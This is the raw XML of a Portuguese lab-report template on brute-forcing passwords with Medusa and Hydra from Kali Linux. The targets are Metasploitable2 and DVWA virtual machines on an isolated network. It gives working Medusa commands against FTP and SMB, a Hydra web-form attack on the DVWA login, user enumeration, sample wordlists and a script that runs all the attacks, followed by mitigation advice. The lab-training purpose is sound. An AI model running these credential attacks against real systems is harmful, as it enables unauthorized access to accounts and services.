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Heading_20_2">
      <style:text-properties style:font-name="Liberation Sans"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Liberation Sans" fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Liberation Sans" fo:font-size="10pt" officeooo:rsid="001894ed" officeooo:paragraph-rsid="001894ed" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties style:font-name="Liberation Sans" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="00135c29"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="001727ef"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="00137f49"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="00153d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 Técnico — Laboratório de Força Bruta com Medusa</text:h>
      <text:p text:style-name="P2">Projeto: <text:span text:style-name="T1">Simulação de ataque de força bruta de senhas com Medusa e Kali Linux </text:span><text:span text:style-name="T2">usando Vms em ambiente controlado</text:span></text:p>
      <text:p text:style-name="P2">Autor: <text:span text:style-name="T3">Leandro </text:span><text:span text:style-name="T2">Cunha</text:span></text:p>
      <text:p text:style-name="P2">Data: <text:span text:style-name="T1">12 de novembro de 2025</text:span></text:p>
      <text:h text:style-name="P3" text:outline-level="2">Sumário</text:h>
      <text:p text:style-name="P4">1. Resumo Executivo</text:p>
      <text:p text:style-name="P4">2. Escopo e Regras de Engajamento</text:p>
      <text:p text:style-name="P4">3. Ambiente (<text:span text:style-name="T4">V</text:span><text:span text:style-name="T1">irtmanager </text:span><text:span text:style-name="T4">ou Virturalbox</text:span>)</text:p>
      <text:p text:style-name="P4">4. Preparação das VMs — passo a passo com telas (placeholders para imagens)</text:p>
      <text:p text:style-name="P4">5. Ferramentas e instalação (Kali + Medusa, Hydra, enum4linux, smbclient)</text:p>
      <text:p text:style-name="P4">6. Cenários de teste e comandos (FTP, DVWA (web form), SMB)</text:p>
      <text:p text:style-name="P4">7. Wordlists utilizadas</text:p>
      <text:p text:style-name="P4">8. Coleta de evidências e logs</text:p>
      <text:p text:style-name="P4">9. Resultado (modelo de evidências)</text:p>
      <text:p text:style-name="P4">10. Recomendações de mitigação</text:p>
      <text:p text:style-name="P4">11. Template Word para relatório final (estrutura pronta para preencher)</text:p>
      <text:p text:style-name="P4">12. Anexos — scripts e comando para automação</text:p>
      <text:h text:style-name="P3" text:outline-level="2">1. Resumo Executivo</text:h>
      <text:p text:style-name="P4">Descreva aqui, em 3–5 parágrafos curtos, o objetivo do teste, as máquinas envolvidas (Kali como atacante e Metasploitable/DVWA como alvo), os principais achados (por exemplo: credenciais fracas encontradas em FTP e SMB) e o risco associado.</text:p>
      <text:h text:style-name="P3" text:outline-level="2">2. Escopo e Regras de Engajamento</text:h>
      <text:p text:style-name="P4">- Ambiente isolado em VirtualBox <text:span text:style-name="T4">ou Virtmanager</text:span>(host-only / internal network <text:span text:style-name="T4">(importante)</text:span>).</text:p>
      <text:p text:style-name="P4">- Testes realizados apenas nas VMs listadas: Kali Linux (atacante) e Metasploitable2 / DVWA (alvo).</text:p>
      <text:p text:style-name="P4">- Não testar em redes/hosts de produção nem em sistemas de terceiros.</text:p>
      <text:h text:style-name="P3" text:outline-level="2">3. Ambiente (<text:span text:style-name="T1">Virtmanager</text:span>)</text:h>
      <text:p text:style-name="P4">**Configuração recomendada das VMs:**</text:p>
      <text:p text:style-name="P4">- Rede: Host-only (ex: 192.168.56.0/24) ou Internal Network.</text:p>
      <text:p text:style-name="P4">- Kali: 2 vCPU, 4–8 GB RAM, disco 40–64 GB, Adapter de rede: Host-only.</text:p>
      <text:p text:style-name="P4">- Metasploitable2: 1 vCPU, 1–2 GB RAM, disco 20 GB, Adapter de rede: Host-only.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">**IPs (exemplo):**</text:p>
      <text:p text:style-name="P4">- Kali: 192.168.56.100</text:p>
      <text:p text:style-name="P4">- Metasploitable2: 192.168.56.101</text:p>
      <text:p text:style-name="P4">- DVWA (se separado): 192.168.56.102</text:p>
      <text:h text:style-name="P3" text:outline-level="2">4. Preparação das VMs — passo a passo com telas</text:h>
      <text:p text:style-name="P4">Instrução: nos campos abaixo coloque as capturas de tela correspondentes às etapas.</text:p>
      <text:p text:style-name="P4">4.1 Criar VM Kali</text:p>
      <text:p text:style-name="P4">1. VirtualBox → Novo → Nome: Kali → Tipo: Linux → Versão: Debian (64-bit).</text:p>
      <text:p text:style-name="P4">Figura 1 — Tela Novo (Criar VM): [INSERIR PRINT]</text:p>
      <text:p text:style-name="P4">2. Memória: 4096 MB (ou 8192 MB). Figura 2 — Memória: [INSERIR PRINT]</text:p>
      <text:p text:style-name="P4">3. Disco: VDI dinâmico, 40 GB. Figura 3 — Disco: [INSERIR PRINT]</text:p>
      <text:p text:style-name="P4">4. Rede: Adapter 1 → Host-only Adapter (vboxnet0). Figura 4 — Rede: [INSERIR PRINT]</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">4.2 Criar VM Metasploitable2</text:p>
      <text:p text:style-name="P4">1. VirtualBox → Novo → Nome: Metasploitable2 → Tipo: Linux → Versão: Other Linux (32-bit).</text:p>
      <text:p text:style-name="P4">Figura 5 — Novo Metasploitable2: [INSERIR PRINT]</text:p>
      <text:p text:style-name="P4">2. Memória: 1024–2048 MB. Disco: 20 GB.</text:p>
      <text:p text:style-name="P4">3. Rede: Adapter 1 → Host-only Adapter (mesma rede que Kali). Figura 6 — Rede Metasploitable: [INSERIR PRINT]</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P5">Com o Virtmanager, segue o fluxo da interface clicando para criar uma VM e seguida realizar a instalação dos SOs.</text:p>
      <text:p text:style-name="P4"><text:soft-page-break/></text:p>
      <text:p text:style-name="P4">4.3 Confirmar conectividade (comandos)</text:p>
      <text:p text:style-name="P4">Na Kali:</text:p>
      <text:p text:style-name="P4">ip a</text:p>
      <text:p text:style-name="P4">ping -c 3 192.168.56.101</text:p>
      <text:p text:style-name="P4">Figura 7 — Ping para alvo: [INSERIR PRINT]</text:p>
      <text:h text:style-name="P6" text:outline-level="2">5. Ferramentas e instalação (Kali)</text:h>
      <text:p text:style-name="P4">No Kali, atualize e instale as ferramentas principais:</text:p>
      <text:p text:style-name="P4">sudo apt update &amp;&amp; sudo apt upgrade -y</text:p>
      <text:p text:style-name="P4">sudo apt install medusa hydra enum4linux smbclient smbmap net-tools tcpdump -y</text:p>
      <text:p text:style-name="P4">Verificar Medusa:</text:p>
      <text:p text:style-name="P4">medusa -h</text:p>
      <text:p text:style-name="P4">medusa -d</text:p>
      <text:h text:style-name="P6" text:outline-level="2">6. Cenários de teste e comandos (FTP, DVWA, SMB)</text:h>
      <text:p text:style-name="P4">OBS: Execute apenas em ambiente de laboratório.</text:p>
      <text:p text:style-name="P4">6.1 Força bruta FTP (Medusa)</text:p>
      <text:p text:style-name="P4">Wordlists: users.txt e passwords.txt (ver seção 7)</text:p>
      <text:p text:style-name="P4">Comando (usuário único):</text:p>
      <text:p text:style-name="P4">medusa -h 192.168.56.101 -u ftp -P /home/kali/passwords.txt -M ftp -T 8 -f -O /home/kali/medusa_ftp_results.txt</text:p>
      <text:p text:style-name="P4">Comando (lista de usuários):</text:p>
      <text:p text:style-name="P4">medusa -M ftp -h 192.168.56.101 -U /home/kali/users.txt -P /home/kali/passwords.txt -T 6 -O /home/kali/medusa_ftp_multi.txt</text:p>
      <text:p text:style-name="P4">Validação quando encontrar credenciais:</text:p>
      <text:p text:style-name="P4">ftp 192.168.56.101</text:p>
      <text:p text:style-name="P4">curl -v ftp://usuario:senha@192.168.56.101/</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">6.2 Ataque a formulário web (DVWA) — Hydra recomendado</text:p>
      <text:p text:style-name="P4">Hydra (exemplo para DVWA):</text:p>
      <text:p text:style-name="P4">hydra -L /home/kali/users.txt -P /home/kali/passwords.txt 192.168.56.102 http-post-form "/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:F=incorrect" -t 8 -V -w 5</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">6.3 Password spraying / SMB (Medusa)</text:p>
      <text:p text:style-name="P4">Enumere usuários:</text:p>
      <text:p text:style-name="P4">enum4linux -U 192.168.56.101</text:p>
      <text:p text:style-name="P4">smbmap -H 192.168.56.101</text:p>
      <text:p text:style-name="P4">Executar Medusa (smbnt):</text:p>
      <text:p text:style-name="P4">medusa -M smbnt -h 192.168.56.101 -U /home/kali/users.txt -P /home/kali/passwords.txt -T 8 -O /home/kali/medusa_smb_results.txt</text:p>
      <text:p text:style-name="P4">Validar credenciais:</text:p>
      <text:p text:style-name="P4">smbclient -L //192.168.56.101 -U usuario%senha</text:p>
      <text:p text:style-name="P4">smbclient //192.168.56.101/share -U usuario%senha</text:p>
      <text:h text:style-name="P6" text:outline-level="2">7. Wordlists utilizadas</text:h>
      <text:p text:style-name="P4">Crie arquivos em /home/kali/wordlists/.</text:p>
      <text:p text:style-name="P4">users.txt (exemplo curto):</text:p>
      <text:p text:style-name="P4">root</text:p>
      <text:p text:style-name="P4">admin</text:p>
      <text:p text:style-name="P4">ftp</text:p>
      <text:p text:style-name="P4">test</text:p>
      <text:p text:style-name="P4">www-data</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">passwords.txt (exemplo curto):</text:p>
      <text:p text:style-name="P4">123456</text:p>
      <text:p text:style-name="P4">password</text:p>
      <text:p text:style-name="P4">admin123</text:p>
      <text:p text:style-name="P4">welcome</text:p>
      <text:p text:style-name="P4">P@ssw0rd</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Observação: para testes maiores, use rockyou.txt ou SecLists, mas tenha cautela – são grandes e ruidosos.</text:p>
      <text:h text:style-name="P6" text:outline-level="2"><text:soft-page-break/>8. Coleta de evidências e logs</text:h>
      <text:p text:style-name="P4">Sempre salve as saídas do Medusa com -O.</text:p>
      <text:p text:style-name="P4">Capture tráfego: (ex: na Kali)</text:p>
      <text:p text:style-name="P4">sudo tcpdump -i any host 192.168.56.101 -w /home/kali/capturas/ftp_capture.pcap</text:p>
      <text:p text:style-name="P4">Gere hash dos logs para integridade:</text:p>
      <text:p text:style-name="P4">sha256sum /home/kali/medusa_*.txt &gt; /home/kali/log_hashes.sha256</text:p>
      <text:p text:style-name="P4">Tire screenshots das telas com sucesso de login.</text:p>
      <text:h text:style-name="P6" text:outline-level="2">9. Resultado (modelo de evidências)</text:h>
      <text:p text:style-name="P4">Preencha com as credenciais encontradas, timestamps e explicação do impacto.</text:p>
      <text:p text:style-name="P4">Exemplo:</text:p>
      <text:p text:style-name="P4">Serviço: FTP</text:p>
      <text:p text:style-name="P4">Alvo: 192.168.56.101</text:p>
      <text:p text:style-name="P4">Credencial encontrada: ftp:123456</text:p>
      <text:p text:style-name="P4">Data/hora: 2025-10-16 09:12:23</text:p>
      <text:p text:style-name="P4">Evidências: /home/kali/medusa_ftp_results.txt, ftp_capture.pcap, screenshot_ftp_login.png</text:p>
      <text:h text:style-name="P6" text:outline-level="2">10. Recomendações de mitigação</text:h>
      <text:p text:style-name="P4">Políticas de senha forte e rotação.</text:p>
      <text:p text:style-name="P4">Bloqueio temporário após N falhas (account lockout).</text:p>
      <text:p text:style-name="P4">Rate limiting e detecção/alerta de bursts de autenticação.</text:p>
      <text:p text:style-name="P4">MFA para serviços críticos.</text:p>
      <text:p text:style-name="P4">Evitar expor SMB/FTP sem necessidade; usar SFTP/FTPS.</text:p>
      <text:p text:style-name="P4">Implementar fail2ban para serviços suportados.</text:p>
      <text:h text:style-name="P6" text:outline-level="2">11. Template Word (estrutura pronta)</text:h>
      <text:p text:style-name="P4">Capa:</text:p>
      <text:p text:style-name="P4">- Título: Relatório de Teste de Força Bruta — [Projeto]</text:p>
      <text:p text:style-name="P4">- Autor: [Seu Nome]</text:p>
      <text:p text:style-name="P4">- Data: [DATA]</text:p>
      <text:p text:style-name="P4">- Nota: Testes conduzidos em ambiente controlado.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Sumário</text:p>
      <text:p text:style-name="P4">1. Resumo Executivo</text:p>
      <text:p text:style-name="P4">2. Escopo</text:p>
      <text:p text:style-name="P4">3. Metodologia</text:p>
      <text:p text:style-name="P4">4. Comandos e Evidências</text:p>
      <text:p text:style-name="P4">5. Resultados</text:p>
      <text:p text:style-name="P4">6. Recomendações</text:p>
      <text:p text:style-name="P4">Anexos: scripts e hashes dos logs</text:p>
      <text:h text:style-name="P6" text:outline-level="2">12. Anexos — Scripts e automatização</text:h>
      <text:p text:style-name="P4">Script exemplo (Kali) — run_all_tests.sh:</text:p>
      <text:p text:style-name="P4">#!/bin/bash</text:p>
      <text:p text:style-name="P4">TARGET_FTP=192.168.56.101</text:p>
      <text:p text:style-name="P4">TARGET_DVWA=192.168.56.102</text:p>
      <text:p text:style-name="P4">TARGET_SMB=192.168.56.101</text:p>
      <text:p text:style-name="P4">USERLIST=/home/kali/wordlists/users.txt</text:p>
      <text:p text:style-name="P4">PASSLIST=/home/kali/wordlists/passwords.txt</text:p>
      <text:p text:style-name="P4">OUTDIR=/home/kali/medusa_results</text:p>
      <text:p text:style-name="P4">mkdir -p $OUTDIR</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"># FTP</text:p>
      <text:p text:style-name="P4">medusa -M ftp -h $TARGET_FTP -U $USERLIST -P $PASSLIST -T 8 -O $OUTDIR/medusa_ftp_$(date +%F_%H%M).txt</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"># SMB</text:p>
      <text:p text:style-name="P4">medusa -M smbnt -h $TARGET_SMB -U $USERLIST -P $PASSLIST -T 8 -O $OUTDIR/medusa_smb_$(date +%F_%H%M).txt</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"># DVWA (Hydra)</text:p>
      <text:p text:style-name="P4"><text:soft-page-break/>hydra -L $USERLIST -P $PASSLIST $TARGET_DVWA http-post-form "/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:F=incorrect" -t 8 -o $OUTDIR/hydra_dvwa_$(date +%F_%H%M).txt</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"># Hash logs</text:p>
      <text:p text:style-name="P4">sha256sum $OUTDIR/* &gt; $OUTDIR/log_hashes_$(date +%F_%H%M).sha256</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">echo "Execução finalizada. Resultados em $OUTDIR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Quote" style:family="paragraph" style:parent-style-name="Standard" style:next-style-name="Standard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macro" style:family="paragraph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Subtitle" style:family="paragraph" style:parent-style-name="Standard" style:next-style-name="Standard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1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1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_20_9" style:display-name="Heading 9" style:family="paragraph" style:parent-style-name="Standard" style:next-style-name="Standard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1" style:font-family-complex="'DejaVu Sans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1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1" style:font-family-complex="'DejaVu Sans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1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Body_20_Text_20_2_20_Char" style:display-name="Body Text 2 Char" style:family="text" style:parent-style-name="Default_20_Paragraph_20_Font"/>
    <style:style style:name="Body_20_Text_20_Char" style:display-name="Body Text Char" style:family="text" style:parent-style-name="Default_20_Paragraph_20_Font"/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1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1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18:32:17.290437800</meta:creation-date>
    <dc:date>2025-11-14T19:23:48.089625560</dc:date>
    <meta:editing-duration>PT15M33S</meta:editing-duration>
    <meta:editing-cycles>5</meta:editing-cycles>
    <meta:generator>LibreOffice/25.8.2.2$Linux_X86_64 LibreOffice_project/580$Build-2</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="4" meta:paragraph-count="151" meta:word-count="895" meta:character-count="6497" meta:non-whitespace-character-count="5742"/>
  </office:meta>
</office:document-meta>
</file>